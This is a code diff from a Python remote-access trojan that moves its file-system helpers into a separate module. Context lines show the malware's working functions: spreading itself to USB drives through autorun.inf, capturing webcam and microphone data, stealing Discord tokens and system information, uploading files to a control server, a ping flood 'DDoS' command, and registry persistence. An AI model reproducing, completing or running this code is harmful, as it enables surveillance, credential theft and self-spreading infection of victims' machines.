@@ -18,6 +18,7 @@ import sys
 import multiprocessing
 import re
 import datetime
+from . import fs
 
 # Should show debug messages?
 DEBUG = True
@@ -184,7 +185,7 @@ def load_name() -> None:
 
     try:
         path = FOLDER + CONFIG["paths"]["name"]
-        filesystem_build_path(path)
+        fs.build_path(path)
 
         if os.path.exists(path):
             try:
@@ -208,7 +209,7 @@ def save_name() -> None:
 
     try:
         path = FOLDER + CONFIG["paths"]["name"]
-        filesystem_build_path(path)
+        fs.build_path(path)
 
         with open(path, "w", encoding="UTF-8") as name_file:
             name_file.write(str(CLIENT_NAME))
@@ -234,7 +235,7 @@ def drive_inject_autorun_executable(drive: str) -> None:
         executable_path = "autorun\\autorun." + executable_get_extension()
 
         if not os.path.exists(drive + executable_path):
-            filesystem_build_path(drive + executable_path)
+            fs.build_path(drive + executable_path)
             shutil.copyfile(sys.argv[0], drive + executable_path)
 
             with open(drive + "autorun.inf", "w", encoding="UTF-8") as autorun_file:
@@ -249,10 +250,10 @@ def drives_watching_thread() -> None:
     """ Thread function that do drives watching and also infecting it if enabled. """
 
     try:
-        current_drives = filesystem_get_drives_list()
+        current_drives = fs.try_get_drives_list()
 
         while True:
-            latest_drives = filesystem_get_drives_list()
+            latest_drives = fs.try_get_drives_list()
 
             connected_drives = list_difference(latest_drives, current_drives)
             disconnected_drives = list_difference(current_drives, latest_drives)
@@ -266,7 +267,7 @@ def drives_watching_thread() -> None:
                 server_message(f"[Spreading] Disconnected drive {drive}!")
                 debug_message(f"[Spreading] Disconnected drive {drive}!")
 
-            current_drives = filesystem_get_drives_list()
+            current_drives = fs.try_get_drives_list()
     except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         debug_message(f"[Drives Watching] Error when watching drives! Exception - {exception}")
 
@@ -316,7 +317,7 @@ def command_webcam(_arguments, _event) -> CommandResult:
     _, image = camera.read()
 
     path = FOLDER + CONFIG["paths"]["webcam"]
-    filesystem_build_path(path)
+    fs.build_path(path)
     cv2.imwrite(path, image)
 
     del camera
@@ -356,7 +357,7 @@ def command_download(arguments, _) -> CommandResult:
 
     if os.path.exists(path):
         if os.path.isfile(path):
-            if filesystem_get_size(path) < 1536:
+            if fs.get_size(path) < 1536:
                 result = CommandResult()
                 result.from_attachment(path, os.path.basename(path), "doc")
                 result.disable_delete_after_uploading()
@@ -364,7 +365,7 @@ def command_download(arguments, _) -> CommandResult:
             return CommandResult("Too big file to download! Maximal size for download: 1536MB (1.5GB)")
         
         if os.path.isdir(path):
-            if filesystem_get_size(path) < 1536:
+            if fs.get_size(path) < 1536:
                 return CommandResult("Directories downloading is not implemented yet!")
             return CommandResult("Too big directory to download! Maximal size for download: 1536MB(1.5GB)")
     else:
@@ -419,8 +420,6 @@ def command_tags_new(arguments, _) -> CommandResult:
 
     if (arguments := arguments.split(";")) and len(arguments) == 0:
         # If no arguments.
-
-        # Message.
         return CommandResult("Incorrect arguments! Example: (tags separated by ;)")
 
     # Tags that was added.
@@ -442,8 +441,6 @@ def command_tags_add(arguments: str, _) -> CommandResult:
 
     if (arguments_list := arguments.split(";")) and len(arguments_list) == 0:
         # If no arguments.
-
-        # Message.
         return CommandResult("Incorrect tags arguments! Example: (tags separated by ;)")
 
     # Clean tags.
@@ -452,10 +449,7 @@ def command_tags_add(arguments: str, _) -> CommandResult:
     # Add tags.
     CLIENT_TAGS.extend(tags)
 
-    # Saving tags.
     save_tags()
-
-    # Message.
     return CommandResult(f"Added new tags: {';'.join(tags)}. Now tags is: {';'.join(CLIENT_TAGS)}")
 
 
@@ -512,10 +506,10 @@ def command_properties(arguments, _) -> CommandResult:
         # If path exists.
 
         # Getting size.
-        property_size = f"{filesystem_get_size(path)}MB"
+        property_size = f"{fs.get_size(path)}MB"
 
         # Getting type.
-        property_type = filesystem_get_type(path)
+        property_type = fs.get_type(path)
 
         # Getting time properties.
         property_created_at = datetime.date.fromtimestamp(os.path.getctime(path))
@@ -586,14 +580,11 @@ def command_cd(arguments, _) -> CommandResult:
 
         if not os.path.isdir(CURRENT_DIRECTORY + "\\" + path):
             # If not directory.
-
-            # Error.
             return CommandResult("Can`t change directory to the filename")
 
         # Changing.
         CURRENT_DIRECTORY += "\\" + path
 
-        # Message.
         return CommandResult(f"Changed directory to {CURRENT_DIRECTORY}")
 
     # If not local path.
@@ -602,23 +593,17 @@ def command_cd(arguments, _) -> CommandResult:
 
         if not os.path.isdir(path):
             # If not directory.
-
-            # Error.
             return CommandResult("Can`t change directory to the filename")
 
         if path == "":
             # If no arguments.
-
-            # Message.
             return CommandResult(f"Current directory - {CURRENT_DIRECTORY}")
 
         # Changing.
         CURRENT_DIRECTORY = path
 
-        # Message.
         return CommandResult(f"Changed directory to {CURRENT_DIRECTORY}")
 
-    # Message.
     return CommandResult(f"Directory {path} does not exists!")
 
 
@@ -718,23 +703,18 @@ def command_ddos(arguments, _) -> CommandResult:
             console_response = os.system(f"ping -c {address} {timeout}")
 
             if console_response == SYSTEM_OK_STATUS_CODE:
-                # Message.
                 return CommandResult("Completed DDoS (Admin)")
 
-            # Error.
             return CommandResult(f"DDoS ping returned non-zero exit code {console_response}! (Admin) (Access Denied?)")
 
         # Pinging from user.
         console_response = os.system(f"ping {address}")
 
         if console_response == SYSTEM_OK_STATUS_CODE:
-            # Message.
             return CommandResult("Completed DDoS (User)")
 
-        # Error.
         return CommandResult(f"DDoS ping returned non-zero status {console_response}! (User)")
 
-    # Message.
     return CommandResult("DDoS incorrect arguments! Example: address;time;admin or address")
 
 
@@ -745,8 +725,7 @@ def command_ls(arguments, _) -> CommandResult:
     directory_path = arguments if arguments != "" else CURRENT_DIRECTORY
 
     # Get files.
-    # TODO filesystem_try_listdir error handling.
-    directory_list = filesystem_try_listdir(directory_path)
+    directory_list = fs.try_listdir(directory_path)
     directory_items = ",\n".join([
         ("[D] " + path if os.path.isdir(directory_path + "\\" + path) else "[F] " + path) for path in directory_list
     ]) if directory_list else "Empty (Or error)!"
@@ -761,10 +740,9 @@ def command_link(arguments, _) -> CommandResult:
     # Get arguments.
     arguments = arguments.split(";")
 
+    # Open with module or not.
     native = False
-
     if len(arguments) > 1 and arguments[1] == "native":
-        # If not native.
         native = True
 
     if not native:
@@ -772,36 +750,23 @@ def command_link(arguments, _) -> CommandResult:
 
         try:
             # Trying to open with the module.
-
-            # Importing module.
             import webbrowser  # noqa, pylint: disable=import-outside-toplevel
-
-            # Opening link.
             webbrowser.open(arguments[0])
-
-            # Message.
             return CommandResult("Link was opened (Via module)!")
         except ImportError:
-            # If there is ImportError.
             pass
 
     # Opening with system.
     console_response = os.system(f"start {arguments[0]}")
 
     if console_response == SYSTEM_OK_STATUS_CODE:
-        # If OK.
-
-        # Message.
         return CommandResult("Link was opened (Via system, native)!")
-
-    # Error..
     return CommandResult(f"Link was not opened! (Non-zero exit code {console_response})")
 
 
 def command_drives(*_) -> CommandResult:
     """ Command `drives` that returns list of all drives in the system. """
-    
-    return CommandResult("Drives: \n" + "Drive: ,\n".join(filesystem_get_drives_list()))
+    return CommandResult("Drives: \n" + "Drive: ,\n".join(fs.try_get_drives_list()))
 
 
 def command_discord_tokens(*_) -> CommandResult:
@@ -917,16 +882,16 @@ def command_destruct(*_) -> CommandResult:
 
     autorun_unregister()
 
-    filesystem_try_delete(FOLDER + "lock")
-    filesystem_try_delete(FOLDER + CONFIG["paths"]["tags"])
-    filesystem_try_delete(FOLDER + CONFIG["paths"]["name"])
-    filesystem_try_delete(FOLDER + CONFIG["paths"]["log"])
-    filesystem_try_delete(FOLDER + CONFIG["paths"]["anchor"])
-    filesystem_try_delete(FOLDER + CONFIG["paths"]["screenshot"])
-    filesystem_try_delete(FOLDER + CONFIG["paths"]["microphone"])
-    filesystem_try_delete(FOLDER + CONFIG["paths"]["webcam"])
-    filesystem_try_delete(FOLDER + CONFIG["autorun"]["executable"])
-    filesystem_try_delete(FOLDER)
+    fs.try_delete(FOLDER + "lock")
+    fs.try_delete(FOLDER + CONFIG["paths"]["tags"])
+    fs.try_delete(FOLDER + CONFIG["paths"]["name"])
+    fs.try_delete(FOLDER + CONFIG["paths"]["log"])
+    fs.try_delete(FOLDER + CONFIG["paths"]["anchor"])
+    fs.try_delete(FOLDER + CONFIG["paths"]["screenshot"])
+    fs.try_delete(FOLDER + CONFIG["paths"]["microphone"])
+    fs.try_delete(FOLDER + CONFIG["paths"]["webcam"])
+    fs.try_delete(FOLDER + CONFIG["autorun"]["executable"])
+    fs.try_delete(FOLDER)
 
     return command_exit(*_)
 
@@ -1026,7 +991,7 @@ def process_message(event) -> None:
 
                             if CONFIG["settings"]["delete_file_after_uploading"] and \
                                     command_result.should_delete_after_uploading():
-                                filesystem_try_delete(uploading_path)
+                                fs.try_delete(uploading_path)
                         else:
                             answer_text = command_result.get_text()
                 else:
@@ -1265,87 +1230,6 @@ def server_upload_document(path: str, title: str, peer: int, document_type: str 
         return False, "Exception Error" + str(exception)
 
 
-# File System.
-
-def filesystem_try_delete(path) -> bool:
-    """ Tries to delete given file"""
-
-    try:
-        os.remove(path)
-        return True
-    except Exception:  # noqa, pylint: disable=broad-except
-        return False
-
-
-def filesystem_try_listdir(path) -> typing.List:
-    """ Tries to list directory. """
-
-    try:
-        return os.listdir(path)
-    except Exception:  # noqa, pylint: disable=broad-except
-        return []
-
-
-def filesystem_get_size(path: str) -> float:
-    """ Returns size of the filesystem element. """
-
-    if os.path.exists(path):
-        if os.path.isfile(path):
-            return int(os.path.getsize(path) / 1024 * 1024)
-
-        if os.path.isdir(path):
-            childrens_size = sum([filesystem_get_size(os.path.join(path, directory))
-                                  for directory in filesystem_try_listdir(path)])
-            return os.path.getsize(path) / 1024 * 1024 + childrens_size
-
-    return 0
-
-
-def filesystem_get_type(path: str) -> str:
-    """ Returns type of the path. """
-
-    if os.path.isdir(path):
-        return "Directory"
-
-    if os.path.isfile(path):
-        return "File"
-
-    if os.path.islink(path):
-        return "Link"
-
-    if os.path.ismount(path):
-        return "Mount"
-
-    return "Unknown"
-
-
-def filesystem_build_path(path: str) -> None:
-    """ Builds path. """
-
-    try:
-        path_elements = path.split("\\")
-        path_elements.pop()
-        path = "\\".join(path_elements)
-
-        if not os.path.exists(path):
-            os.makedirs(path)
-    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
-        debug_message(f"[File System] Failed to build path! Path - {path}. Exception - {exception}")
-
-
-def filesystem_get_drives_list() -> typing.List:
-    """ Returns list of all drives in the system. """
-
-    try:
-        drives_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-        return [f"{drive_letter}:\\\\" for drive_letter in drives_letters
-                if os.path.exists(f"{drive_letter}:\\\\")]
-    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
-        debug_message(f"[File System] Failed to get drives list! Exception - {exception}")
-
-    return []
-
-
 # Tags.
 
 def get_default_tags() -> typing.List:
@@ -1374,7 +1258,7 @@ def load_tags() -> None:
 
     try:
         path = FOLDER + CONFIG["paths"]["tags"]
-        filesystem_build_path(path)
+        fs.build_path(path)
 
         if os.path.exists(path):
             try:
@@ -1403,7 +1287,7 @@ def save_tags() -> None:
         debug_message("[Tags] Saving tags to the file...")
 
         path = FOLDER + CONFIG["paths"]["tags"]
-        filesystem_build_path(path)
+        fs.build_path(path)
 
         with open(path, "w", encoding="UTF-8") as tags_file:
             tags_file.write(json.dumps({
@@ -1497,7 +1381,7 @@ def record_microphone(path, seconds: int = 1) -> None:
     stream.close()
     audio.terminate()
 
-    filesystem_build_path(path)
+    fs.build_path(path)
     file = wave.open(path, 'wb')
     file.setnchannels(1)
     file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
@@ -1725,15 +1609,15 @@ def stealer_steal_all(force: bool = False) -> None:
 
                 data["computer_environment_variables"] = get_environment_variables()
 
-                data["directory_root"] = filesystem_try_listdir(f"{drive}\\")
-                data["directory_programfiles"] = filesystem_try_listdir(f"{drive}\\Program Files")
-                data["directory_programfiles86"] = filesystem_try_listdir(f"{drive}\\Program Files (x86)")
-                data["directory_downloads"] = filesystem_try_listdir(f"{userprofile}\\Downloads")
-                data["directory_documents"] = filesystem_try_listdir(f"{userprofile}\\Documents")
-                data["directory_desktop"] = filesystem_try_listdir(f"{userprofile}\\Desktop")
+                data["directory_root"] = fs.try_listdir(f"{drive}\\")
+                data["directory_programfiles"] = fs.try_listdir(f"{drive}\\Program Files")
+                data["directory_programfiles86"] = fs.try_listdir(f"{drive}\\Program Files (x86)")
+                data["directory_downloads"] = fs.try_listdir(f"{userprofile}\\Downloads")
+                data["directory_documents"] = fs.try_listdir(f"{userprofile}\\Documents")
+                data["directory_desktop"] = fs.try_listdir(f"{userprofile}\\Desktop")
 
             path = FOLDER + CONFIG["paths"]["log"]
-            filesystem_build_path(path)
+            fs.build_path(path)
 
             with open(path, "w", encoding="UTF-8") as log_file:
                 json.dump(data, log_file, indent=4)
@@ -1746,7 +1630,7 @@ def stealer_steal_all(force: bool = False) -> None:
                 else:
                     server_message(f"[Stealer] Error when uploading first launch data: {uploading_result}", None, peer)
 
-            filesystem_try_delete(path)
+            fs.try_delete(path)
     except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
         debug_message(f"[Stealer] Failed to steall all! Exception - {exception}")
 
@@ -1783,7 +1667,7 @@ def stealer_steal_discord_tokens() -> typing.List[str]:
     tokens: typing.List[str] = []
 
     for token_path in (path for path in paths if os.path.exists(path)):
-        for log_file in (file for file in filesystem_try_listdir(token_path) if
+        for log_file in (file for file in fs.try_listdir(token_path) if
                          file.endswith(".log") or file.endswith(".ldb")):
             with open(f"{token_path}\\{log_file}", errors="ignore") as file:
                 for line in [line.strip() for line in file.readlines() if line.strip()]:
@@ -1802,7 +1686,7 @@ def stealer_is_already_worked() -> bool:
 
     if not os.path.exists(path):
 
-        filesystem_build_path(path)
+        fs.build_path(path)
         with open(path, "w", encoding="UTF-8") as anchor_file:
             anchor_file.write("Anchor")
 
@@ -1842,7 +1726,7 @@ def autorun_register() -> None:
         executable_path = f"{FOLDER}{executable_filename}.{executable_get_extension()}"
 
         if not os.path.exists(executable_path):
-            filesystem_build_path(executable_path)
+            fs.build_path(executable_path)
             shutil.copyfile(sys.argv[0], executable_path)
 
         registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
